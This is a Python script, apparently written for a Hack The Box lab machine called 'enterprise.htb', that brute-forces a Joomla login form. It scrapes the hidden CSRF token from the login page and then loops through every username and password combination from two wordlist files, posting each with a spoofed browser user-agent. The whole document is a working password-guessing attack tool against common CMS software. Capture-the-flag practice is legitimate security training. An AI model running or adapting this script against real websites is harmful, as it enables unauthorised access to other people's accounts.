import requests
from bs4 import BeautifulSoup

URL = 'http://enterprise.htb:8080/index.php/component/users/?view=login&Itemid=101'
USERNAMES = '/home/kali/HTB/Machines/Enterprise_NF/users.txt'
PASSWORDS = '/home/kali/HTB/Machines/Enterprise_NF/passwords.txt'

def init(username, password):
    r = requests.get(f'{URL}', auth=(username, password))
    cookie = r.cookies.get_dict()
    soup = BeautifulSoup(r.text, 'html.parser')
    ret = soup.find_all(type="hidden")
    ret_value = ret[-2]["value"]
    odd_var = ret[-1]["name"]
    headers = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"}
    return ret_value, odd_var, cookie, headers

def make_login_request(username, password):
    ret_value, odd_var, cookie, headers = init(username, password)
    data = {
        "username": username,
        "password": password,
        "option": "com_users",
        "task": "user.login",
        "return": ret_value,
        odd_var: 1
    }
    r = requests.post(f'{URL}', data=data, headers=headers, cookies=cookie, allow_redirects=True)

    print(f'Status: {r.status_code}, {username}:{password} -- {len(r.text)}')

un = open(USERNAMES).readlines()
pw = open(PASSWORDS).readlines()
for usrname in un:
    usrname = usrname.strip()
    for passwrd in pw:
        passwrd = passwrd.strip()
        make_login_request(usrname, passwrd)
